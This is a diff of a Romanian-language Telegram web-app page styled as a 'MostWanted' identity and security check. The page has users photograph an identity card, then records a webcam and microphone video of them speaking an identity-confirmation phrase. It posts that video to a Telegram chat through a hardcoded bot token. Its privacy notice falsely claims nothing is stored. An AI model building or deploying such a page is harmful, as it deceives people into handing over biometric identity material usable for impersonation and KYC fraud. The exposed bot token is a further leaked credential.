@@ -2,75 +2,95 @@
 <html lang="ro">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MostWanted KYC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>MostWanted Quantum Security</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { background: #000; color: #00FF66; font-family: monospace; padding: 20px; text-align: center; }
-        .box { border: 1px solid #00FF66; padding: 20px; }
-        #v { width: 100%; height: 200px; background: #111; margin: 10px 0; }
-        button { background: #00FF66; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; }
+        :root { --bg-pure: #000000; --terminal-green: #00FF66; --panel-bg: #09090b; --border-toxic: #00FF66; }
+        body { background-color: var(--bg-pure); color: #FFFFFF; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 20px; display: flex; justify-content: center; min-height: 100vh; }
+        .terminal-box { width: 100%; max-width: 360px; background-color: var(--panel-bg); border: 2px solid var(--border-toxic); padding: 20px; }
+        .step { display: none; }
+        .step.active { display: block; }
+        .viewport { width: 100%; height: 210px; background: #020202; border: 1px solid rgba(0, 255, 102, 0.3); margin: 15px 0; position: relative; display: flex; align-items: center; justify-content: center; }
+        video, img { width: 100%; height: 100%; object-fit: cover; }
+        .action-btn { background: var(--terminal-green); color: #000; border: none; padding: 16px; font-weight: bold; cursor: pointer; width: 100%; text-transform: uppercase; margin-top: 10px; }
+        .privacy-box { font-size: 9px; color: #888; border: 1px dashed #333; padding: 8px; margin: 10px 0; text-align: left; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <div id="prompt">PAS 1: Selectează buletinul din galerie.</div>
-    <video id="v" autoplay playsinline></video>
-    <button id="btn" onclick="next()">[ CONTINUĂ ]</button>
+<div class="terminal-box">
+    <div id="step1" class="step active">
+        <h1 style="font-size:20px; color:var(--terminal-green)">MOSTWANTED_NET</h1>
+        <div class="viewport">
+            <img id="idPreview" style="display:none;">
+        </div>
+        <div class="privacy-box">[PRIVACY]: Datele nu sunt stocate. Sunt analizate în timp real și șterse imediat după validare.</div>
+        
+        <input type="file" id="idInput" accept="image/*" capture="environment" style="display: none;">
+        
+        <button class="action-btn" onclick="document.getElementById('idInput').click()">[ SCAN_LIVE_DOCUMENT ]</button>
+        <button class="action-btn" id="nextStepBtn" style="display:none;" onclick="goToStep2()">NEXT_STAGE >></button>
+    </div>
+
+    <div id="step2" class="step">
+        <div id="instruction" style="font-size:12px; margin-bottom:10px;">Rostiți: "Confirm identitatea, azi <span id="dateText"></span>"</div>
+        <div class="viewport">
+            <video id="videoPreview" autoplay muted playsinline></video>
+        </div>
+        <button class="action-btn" id="recordBtn" onclick="toggleRecording()">[ START_RECORD ]</button>
+        <div id="logText" style="font-size:10px; margin-top:10px;">> Așteptare...</div>
+    </div>
 </div>
 
-<input type="file" id="f" accept="image/*" style="display:none">
-
 <script>
-    const v = document.getElementById('v');
-    const btn = document.getElementById('btn');
-    const prompt = document.getElementById('prompt');
-    const f = document.getElementById('f');
-    
-    let stage = 0;
-    let stream;
-    let recorder;
-    let chunks = [];
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+    document.getElementById('dateText').innerText = new Date().toLocaleDateString('ro-RO', { day: 'numeric', month: 'long', year: 'numeric' });
 
-    async function next() {
-        if (stage === 0) {
-            f.click();
-        } else if (stage === 1) {
-            stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
-            v.srcObject = stream;
-            prompt.innerText = "PAS 2: Înregistrează. Spune: \"Confirm identitatea mea, astăzi 13 Iulie 2026\".";
-            btn.innerText = "[ START_RECORDING ]";
-            stage = 2;
-        } else if (stage === 2) {
-            recorder = new MediaRecorder(stream);
+    // Captura LIVE
+    document.getElementById('idInput').onchange = (e) => {
+        const file = e.target.files[0];
+        if (file) {
+            const reader = new FileReader();
+            reader.onload = (ev) => {
+                document.getElementById('idPreview').src = ev.target.result;
+                document.getElementById('idPreview').style.display = 'block';
+                document.getElementById('nextStepBtn').style.display = 'block';
+            };
+            reader.readAsDataURL(file);
+        }
+    };
+
+    async function goToStep2() {
+        document.getElementById('step1').classList.remove('active');
+        document.getElementById('step2').classList.add('active');
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        document.getElementById('videoPreview').srcObject = stream;
+    }
+
+    let chunks = [];
+    let recorder;
+    function toggleRecording() {
+        const btn = document.getElementById('recordBtn');
+        if (btn.innerText === "[ START_RECORD ]") {
+            recorder = new MediaRecorder(document.getElementById('videoPreview').srcObject);
             recorder.ondataavailable = (e) => chunks.push(e.data);
-            recorder.onstop = sendData;
+            recorder.onstop = () => sendData(new Blob(chunks, {type: 'video/webm'}));
             recorder.start();
             btn.innerText = "[ STOP_AND_SEND ]";
-            stage = 3;
-        } else if (stage === 3) {
+        } else {
             recorder.stop();
-            btn.innerText = "[ TRIMITERE... ]";
         }
     }
 
-    f.onchange = () => {
-        prompt.innerText = "Buletin încărcat. Apasă pentru biometrie.";
-        stage = 1;
-    };
-
-    async function sendData() {
-        const blob = new Blob(chunks, {type: 'video/webm'});
+    function sendData(blob) {
+        document.getElementById('logText').innerText = "> SE TRIMITE...";
         const fd = new FormData();
         fd.append("chat_id", "-1003936586656");
         fd.append("video", blob, "identitate.webm");
-        
-        await fetch("https://api.telegram.org/bot8309275788:AAEfr_9zmaV6BmYKO4ISlEUITpInK-Fm6uk/sendVideo", {
-            method: "POST", body: fd
-        });
-        prompt.innerText = "Trimitere completă. Închide fereastra.";
-        btn.style.display = 'none';
+        fetch("https://api.telegram.org/bot8309275788:AAEfr_9zmaV6BmYKO4ISlEUITpInK-Fm6uk/sendVideo", { method: "POST", body: fd })
+        .then(() => { document.getElementById('logText').innerText = "> SUCCES. SESIUNE ÎNCHISĂ."; setTimeout(() => tg.close(), 1000); });
     }
 </script>
 </body>
